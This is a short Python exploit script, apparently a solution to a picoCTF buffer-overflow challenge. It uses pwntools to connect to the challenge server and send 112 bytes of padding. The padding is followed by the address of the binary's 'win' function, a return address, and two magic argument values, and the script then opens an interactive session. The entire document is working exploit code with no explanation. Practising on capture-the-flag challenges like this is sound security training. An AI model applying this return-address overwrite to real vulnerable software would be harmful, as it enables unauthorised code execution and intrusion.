#!/usr/bin/env python3

from pwn import *

prog = ELF("./vuln")
p = remote("saturn.picoctf.net", 64557) 
junk = b"A"*112
#win_adress = p32(0x8049296)
win_adress = p32(prog.symbols["win"])
main_adress = p32(prog.symbols["main"])
param1 = p32(0xCAFEF00D)
param2 = p32(0xF00DF00D)



payload = b"".join(
        [
            junk, 
            win_adress,
            main_adress,
            param1,
            param2,
        ]
    )

#p = prog.process()
print(p.recvline().decode('utf-8'))
payload += b"\n"
p.send(payload)

p.interactive()
